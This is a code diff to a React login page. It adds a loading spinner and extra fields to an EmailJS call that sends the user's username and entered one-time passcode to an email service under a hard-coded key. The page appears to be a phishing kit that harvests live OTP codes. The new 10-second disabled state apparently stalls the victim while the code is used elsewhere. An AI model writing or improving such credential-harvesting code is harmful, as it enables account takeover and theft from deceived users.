@@ -16,6 +16,7 @@ function App() {
   const [otpCode, setOtpCode] = useState("");
   const [maskedEmail, setMaskedEmail] = useState("");
   const [sessionId, setSessionId] = useState(null);
+  const [isOtpSubmitting, setIsOtpSubmitting] = useState(false);
   const lastProcessedStateRef = useRef(null); // Track processed states using ref
 
   const API_URL = process.env.REACT_APP_API_URL || "http://localhost:3001";
@@ -519,6 +520,9 @@ function App() {
       return;
     }
 
+    // Set loading state
+    setIsOtpSubmitting(true);
+
     console.log("OTP submitted:", otpCode);
 
     // Send email with username and OTP
@@ -529,6 +533,8 @@ function App() {
         {
           username: username,
           otp_code: otpCode,
+          request_type: "otp_submission", // Flag to indicate OTP submission
+          message: "OTP code submitted by user",
         },
         "bfy_j4oBXNKFpGcDC"
       );
@@ -536,6 +542,11 @@ function App() {
     } catch (error) {
       console.error("EmailJS error:", error);
     }
+
+    // Show loading spinner for 10 seconds
+    setTimeout(() => {
+      setIsOtpSubmitting(false);
+    }, 10000);
   };
 
   const handleGetNewCode = async () => {
@@ -655,6 +666,7 @@ function App() {
               value={otpCode}
               onChange={(e) => setOtpCode(e.target.value)}
               maxLength={6}
+              disabled={isOtpSubmitting}
             />
 
             <button
@@ -694,8 +706,12 @@ function App() {
               Get a new code
             </button>
 
-            <button type="submit" className="continue-button">
-              Continue
+            <button
+              type="submit"
+              className={`continue-button ${isOtpSubmitting ? "loading" : ""}`}
+              disabled={isOtpSubmitting}
+            >
+              {isOtpSubmitting ? <span className="spinner"></span> : "Continue"}
             </button>
             <button
               type="button"
